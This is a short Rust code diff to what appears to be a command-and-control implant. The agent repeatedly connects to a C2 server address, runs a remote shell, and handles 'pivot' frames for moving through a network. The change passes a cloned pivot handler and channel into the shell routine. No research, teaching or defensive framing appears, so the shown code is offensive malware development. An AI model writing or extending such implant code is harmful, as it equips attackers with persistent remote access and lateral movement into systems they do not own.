@@ -43,9 +43,10 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
     }
 
     // Spawn pivot frame handler in background
+    let pivot_handler_bg = pivot_handler.clone();
     tokio::spawn(async move {
         while let Some(frame) = pivot_rx.recv().await {
-            pivot_handler.lock().await.handle_frame(frame).await;
+            pivot_handler_bg.lock().await.handle_frame(frame).await;
         }
     });
 
@@ -60,7 +61,7 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
     info!("[AGENT] Starting main loop. Agent ID: {}", agent_id);
     loop {
         info!("[NETWORK] Attempting connection to C2: {}", server_addr);
-        if let Err(e) = run_shell(&server_addr, &agent_id).await {
+        if let Err(e) = run_shell(&server_addr, &agent_id, pivot_handler.clone(), pivot_tx.clone()).await {
             error!("[ERROR] Shell error: {}. Retrying...", e);
             time::sleep(Duration::from_secs(5)).await;
         }
